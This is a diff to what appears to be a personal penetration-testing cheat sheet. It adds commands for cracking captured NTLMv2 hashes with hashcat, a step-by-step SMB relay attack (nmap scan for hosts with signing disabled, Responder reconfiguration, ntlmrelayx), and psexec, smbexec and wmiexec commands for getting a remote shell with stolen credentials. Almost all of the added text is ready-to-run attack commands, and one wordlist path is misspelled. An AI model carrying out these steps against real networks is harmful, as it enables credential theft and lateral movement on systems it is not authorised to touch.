@@ -17,7 +17,38 @@ Cracking Captured HASH
 1. Identify the Hash
 > hashid hash.txt 
 
-2. sudo hashcat -m 5600 hash.txt                     // 5600 - NTLMv2 hash 
+2. sudo hashcat -m 5600 hash.txt  .usr/share/wordlist/rocku.txt --force           // 5600 - NTLMv2 hash 
+
+SMB Relay
+--------------------------------------------------------
+Use the hash cpatured from the responder to gain access to other machines instead of cracking the hash.Howerver there are two requirements for successfull execution of this attack.
+REQ1 --> SMB signing must be disabled on the target machine.
+REQ2 --> Relayed user must be admin on the target machine.
+
+1. Identify the hosts with SMB signing disabled.
+> nmap --script=smb2-security-mode.nse -p445 <IP/RANGE>            // to identify nmap smb script run `locate *.nse | grep smb`
+2. Create text file say targets.txt with the host identified as smb signing disabled / not required.
+3. Edit responder.conf file and st below options as
+        SMB = Off
+        http = Off
+        
+4. Start responder using below command and ensure that HTTP and SMB is OFF.
+> sudo responder -I eth1 -dwv
+5. Set ntlmrelay using below commnad
+> sudo ntlmrelayx.py -tf targets.txt -smb2support
+
+
+Gaining Shell once credentails are obtained
+--------------------------------------------------------
+1. Use below commands
+
+> psexec.py <DOMAIN.local>/<USER>:<PASS>@<TARGET_IP> 
+OR
+> Use msf module psexec
+OR
+> smbexec.py <DOMAIN.local>/<USER>:<PASS>@<TARGET_IP> 
+OR
+> wmiexec.py <DOMAIN.local>/<USER>:<PASS>@<TARGET_IP> 
 
 
 
